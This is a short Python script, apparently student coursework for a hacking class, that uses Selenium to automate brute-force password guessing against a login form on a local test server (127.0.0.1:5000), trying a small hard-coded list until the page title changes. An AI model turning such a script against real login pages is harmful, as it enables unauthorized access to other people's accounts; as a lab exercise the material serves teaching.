# selenium eigentlich zum Testen von Webseiten aber auch Bruteforce mlg
# pip install selenium, webdriver
# https://googlechromelabs.github.io/chrome-for-testing/   Chrome Version 147.0.7727.102
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By 
import time
#from webdriver_manager.chrome import ChromeDriverManager

print("Selenium Bruteforce")
s = Service(executable_path=r"C:\Users\kevin\OneDrive\Desktop\6. Semester\Hacking with Python\chromedriver-win64\chromedriver.exe")
driver = webdriver.Chrome(service=s)

website = "http://127.0.0.1:5000/login"

driver.get(website)

# wordlist verwenden
passwords = ["sdf", "hksda", "db", "de"]
for passw in passwords:
    driver.get(website)
    time.sleep(10)
    print(f"Trying {passw}")

    res = driver.find_elements(By.CLASS_NAME, "form-control")

    print(f"Check {len(res)}")

    time.sleep(10)
    
    res[0].clear()
    res[0].send_keys("de")

    res[1].clear()
    res[1].send_keys(passw)

    button = driver.find_elements(By.CLASS_NAME, "btn")
    print(f"Check2 {len(button)}")

    button[0].click()

    print(f"Title of this page is: {driver.title}")
    if driver.title != "Login":
        print(f"Password found: {passw}")
        break

driver.quit()